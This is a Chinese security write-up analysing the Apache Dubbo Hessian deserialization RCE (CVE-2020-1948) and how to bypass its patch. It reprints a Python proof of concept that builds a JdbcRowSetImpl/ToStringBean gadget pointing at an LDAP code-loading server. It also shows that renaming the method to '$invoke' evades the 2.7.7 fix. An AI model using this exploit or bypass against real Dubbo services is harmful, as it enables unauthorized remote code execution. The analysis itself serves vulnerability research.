**作者：天融信阿尔法实验室  
公众号：**
## Apache Dubbo简介
Dubbo是一个分布式服务框架，致力于提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。简单的说，dubbo就是个服务框架，如果没有分布式的需求，其实是不需要用的，只有在分布式的时候，才有dubbo这样的分布式服务框架的需求，并且本质上是个服务调用的东东，说白了就是个远程服务调用的分布式框架（告别Web
Service模式中的WSdl，以服务者与消费者的方式在dubbo上注册） 其核心部分包含:
  * 远程通讯: 提供对多种基于长连接的NIO框架抽象封装，包括多种线程模型，序列化，以及“请求-响应”模式的信息交换方式。
  * 集群容错: 提供基于接口方法的透明远程过程调用，包括多协议支持，以及软负载均衡，失败容错，地址路由，动态配置等集群支持。
  * 自动发现: 基于注册中心目录服务，使服务消费方能动态的查找服务提供方，使地址透明，使服务提供方可以平滑增加或减少机器。
下图是来自Apache dubbo 官网的工作流程和原理
![
](https://images.seebug.org/content/images/2020/07/0e3a57cb-c5c4-477c-aa68-da039c1e35c5.png-w331s)
  * **Provider**
  * 暴露服务方称之为“服务提供者”
  * **Consumer**
  * 调用远程服务方称之为“服务消费者”
  * **Registry**
  * 服务注册与发现的中心目录服务称之为“服务注册中心”
  * **Monitor**
  * 统计服务的调用次调和调用时间的日志服务称之为“服务监控中心”
  * **Container**
  * 服务运行容器。
Provider将本地提供的远程方法在注册中心进行注册，Consumer需要调用时会先去注册中心进行查询，根据注册中心返回的结果再去对应的Provider中调用对应的远程方法，如果有变更，注册中心将基于长连接推送变更数据给Consumer
。
启动注册中心，Apache dubbo 推荐使用的注册中心时Apache ZooKeeper注册中心
下载地址
启动ZooKeeper之前可以自定义修改 “/conf/zoo.cfg”配置文件里的 clientPort和dataDir的值。
![
](https://images.seebug.org/content/images/2020/07/979071e8-7c39-4fb7-aa4a-0ff478ab0d01.png-w331s)
Apache Dubbo有一个web端的管理界面 github地址如下 
下载完成后进入/dubbo-admin-server/src/main/resources目录修改application.properties配置文件，将其中的注册中心地址修改为自己启动的注册中心的地址
![
](https://images.seebug.org/content/images/2020/07/25d61b83-ff0a-4005-a0f8-6a5514d8ec40.png-w331s)
dubbo-admin-server 目录下运行 mvn package -Dmaven.test.skip=true 将该模块打包成jar包
![
](https://images.seebug.org/content/images/2020/07/21b02e18-d489-4345-ae5a-74f6e8f8895d.png-w331s)
然后 java -jar dubbo-admin-server-0.2.0-SNAPSHOT.jar 启动dubbo-admin-server，此时启动了
dubbo管理的服务端但是没有UI界面。
进入到 dubbo-admin-ui 中 执行 npm install 该命令执行完成后 执行npm run dev 。
访问http://localhost:8081 此时就有了UI界面，默认账号密码都是root，在服务查询中
我们可以看到Provider在Zookeeper注册中心中注册的远程方法服务，目前没有注册所以无可用数据。
![
](https://images.seebug.org/content/images/2020/07/94f14d2c-da1d-4fc5-aff5-ce674d103655.png-w331s)
启动我们使用dubbo框架写的程序
![
](https://images.seebug.org/content/images/2020/07/494445c8-cc87-42a0-94d1-65374b5e4131.png-w331s)
可以看到我们的远程方法服务成功在zookeeper注册中心进行注册
![
](https://images.seebug.org/content/images/2020/07/5fa739b3-072d-4dd2-bd7b-671b9b1ecc06.png-w331s)
## CVE-2020-1948 深度分析
首先观察一下网上已经公布的POC的代码
    from hessian2 import new_object
    from client import DubboClient
    client = DubboClient('127.0.0.1', 20880)
    JdbcRowSetImpl=new_object(
          'com.sun.rowset.JdbcRowSetImpl',
          dataSource="ldap://127.0.0.1:8087/ExploitMac",
          strMatchColumns=["fxx"]
          )
    JdbcRowSetImplClass=new_object(
          'java.lang.Class',
          name="com.sun.rowset.JdbcRowSetImpl",
          )
    toStringBean=new_object(
          'com.rometools.rome.feed.impl.ToStringBean',
          beanClass=JdbcRowSetImplClass,
          obj=JdbcRowSetImpl
          )
    resp = client.send_request_and_return_response(
        service_name='com.example.provider.service.UesrService',
        method_name='test',
        args=[toStringBean])
不难看出，该漏洞利用链最终是通过JdbcRowSetImpl调用jndi来进行远程代码执行。同时我们发现该gadget中用到了com.rometools.rome.feed.impl.ToStringBean，所以Provider的pom.xml中需要添加rometools的引用
        com.rometools
        rome
        1.7.0
通过wireshark抓包来看一下 POC发出的报文内容
![
](https://images.seebug.org/content/images/2020/07/49c29b7b-2293-41fe-a830-a5250fe968ae.png-w331s)
我们将断点打在 org.apache.dubbo.remoting.transport.DecodeHandler 的第57行代码上。
![
](https://images.seebug.org/content/images/2020/07/45ac5527-e883-4593-927a-ea631b13b8ac.png-w331s)
跟进该方法后可以看到该方法内首先会进行一个if判断，判断完成后会调用DecodeableRpcInvocation.decode()方法并传递进去两个参数，其中有一个inputStream参数，我们详细看一下该参数的内容
![
](https://images.seebug.org/content/images/2020/07/1289934a-e63d-44f3-9437-d9f2e0836ccd.png-w331s)
![
](https://images.seebug.org/content/images/2020/07/2156c500-edf5-42ff-b0e1-8e5c49bca91a.png-w331s)
可以看到正是我们通过POC发送的序列化数据
跟进该方法，在第131行代码处有一个if判断，这里通过RefctUtils.desc2classArray()处理完desc参数然后返回一个ToStringBean的类对象。
![
](https://images.seebug.org/content/images/2020/07/5668ee5e-f804-4f96-8457-429fc1012639.png-w331s)
紧接着通过Hessian将ToStringBean的类对象反序列化成ToStringBean对象并赋值给args参数
![
](https://images.seebug.org/content/images/2020/07/433d4981-e9b1-4f43-8b37-363920e8a8c7.png-w331s)
仔细观察一下此时args指向的ToStringBean对象的详细内容，可见此时ToStringBean对象有两个属性已经被赋值为JdbcRowSetImpl。
![
](https://images.seebug.org/content/images/2020/07/9049eef2-79e8-42b6-a1b9-937a8662da7e.png-w331s)
当前方法执行完成后
args参数和pts参数分别被赋值给当前对象的arguments属性和parameterTypes属性，然后当前DecodeableRpcInvocation作为参数进行返回
返回到DecodeHandler中，在第51行代码中传入的message参数是一个Request对象，该Request对象是dubbo的包中的，简单看一下该对象的详细信息
![
](https://images.seebug.org/content/images/2020/07/551756e0-0dff-453c-9184-2bbc0bc1ed4d.png-w331s)
跟进该方法，然后继续跟进handleRequest()方法。
![
](https://images.seebug.org/content/images/2020/07/98a39fb3-35de-4292-9d5c-26ed2233b0af.png-w331s)
在DubboProtocol类的第263行代码中经过一个if判断然后判断成功会抛出一个RemotingException，关键点就在这里，可以看到传入的参数中采用了字符串拼接的形式，当使用字符串拼接的时候，会自动调用StringBuilder的对象的append方法，依次处理channel.getRemoteAddress()的返回值，channel.getLocalAddress()的返回值，getInvocationWithoutData(inv)的返回值，而getInvocationWithoutData(inv)的返回值正式含有恶意请求的DecodeableRpcInvocation对象，StringBuilder要调用DecodeableRpcInvocation的toString方法将其转化为字符串
![
](https://images.seebug.org/content/images/2020/07/0d448fdb-539e-456e-bbeb-46e7a18092a3.png-w331s)
![
](https://images.seebug.org/content/images/2020/07/fbe2594c-9cae-4f3a-af0e-de2ba76f207e.png-w331s)
DecodeableRpcInvocation类的父类RpcInvocation重写了toString方法，看一下RpcInvocation.toString()方法的实现
![
](https://images.seebug.org/content/images/2020/07/ea6d5783-c6db-4636-bae4-e87ea472cfcf.png-w331s)
同样还是字符串拼接，其中Arrays.toString(arguments)，agruments正是之前封装进DecodeableRpcInvocation对象中的ToStringBean对象。接下来自然会调用ToStringBean.toString()方法。
ToStringBean.toString()方法，执行时取出其中的obj属性获取其类名称，并作为参数传入另一个重写的toString方法
![
](https://images.seebug.org/content/images/2020/07/1c275680-6f86-4343-a465-b20128f4bf4e.png-w331s)
该toString方法中会通过反射不断调用JdbcRowSetImpl对象的各个方法，当反射调用JdbcRowSetImpl对象的getDatabaseMetaData方法时，会触发JDNI远程访问dataSource
![
](https://images.seebug.org/content/images/2020/07/a9fba586-bd39-4692-af2d-1da7c5ecfd6b.png-w331s)
我们可以看到dataSource的值
![
](https://images.seebug.org/content/images/2020/07/147200e4-01bb-419c-8c94-366c4cf9370a.png-w331s)
![
](https://images.seebug.org/content/images/2020/07/668b18bf-3306-4da4-b809-66945c751495.png-w331s)
至此Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞原理分析完毕
## 补丁绕过分析
这次针对该漏洞的补丁非常简单，在分析该漏洞时说过在DecodeableRpcInvocation类的第131行有一个if
判断，以下是2.7.6版本中该判断的代码
更新后的2.7.7版本该判断的代码如下，可见在该判断内有增加了一个if
判断，且新增加的判断如果判断失败则会抛出IllegalArgumentException异常终止当前线程的执行。
![
](https://images.seebug.org/content/images/2020/07/33b04e03-e82a-486c-98c0-13c4e67bbbfe.png-w331s)
那么如何绕过该判断让程序继续执行下去从而触发远程代码执行，我们跟入RpcUtils.isGenericCall()方法中来仔细观察。
![
](https://images.seebug.org/content/images/2020/07/92bb300d-42cd-49ce-9ca5-4322d047e1b7.png-w331s)
不难发现该方法内用仅仅只用String.equals方法对比了method参数是否和INVOKE_ASYNC常量的值相同。
我门看一下两个常量的值
![
](https://images.seebug.org/content/images/2020/07/59217bd5-4fc8-45e2-a4e0-015a28ac717b.png-w331s)
我们此时 method的值为“test”可见并不相同，紧接着进入RpcUtils.isEcho()方法，同样是和常量进行对比，显然结果也不相同
![
](https://images.seebug.org/content/images/2020/07/3e5ae86a-1b68-4aeb-94a5-0ff41d5e210b.png-w331s)
![
](https://images.seebug.org/content/images/2020/07/200bd49a-e65c-4659-b5b9-36824e0090a4.png-w331s)
所以if
判断内的最终结果为true，从而抛出异常终止执行。绕过的方法相比大家也都想到了，我们只要让method的值等于“$invoke”，“$invokeAsync”，“$echo”任意一个即可绕过。我们返回POC中查看与method对应的值是哪一个
![
](https://images.seebug.org/content/images/2020/07/744a3ea1-178e-4f96-be75-0f64bf59ef1f.png-w331s)
一眼就能发现其中的method_name就是我们要找的，我们只需要修改‘test’为‘$invoke’即可对当前补丁进行绕过。
## 总结
此次漏洞是序列化传输到后台的数据被翻序列化完成后，在后续的处理过程中的一个异常处理中进行了危险操作，从而触发了gadget。
* * *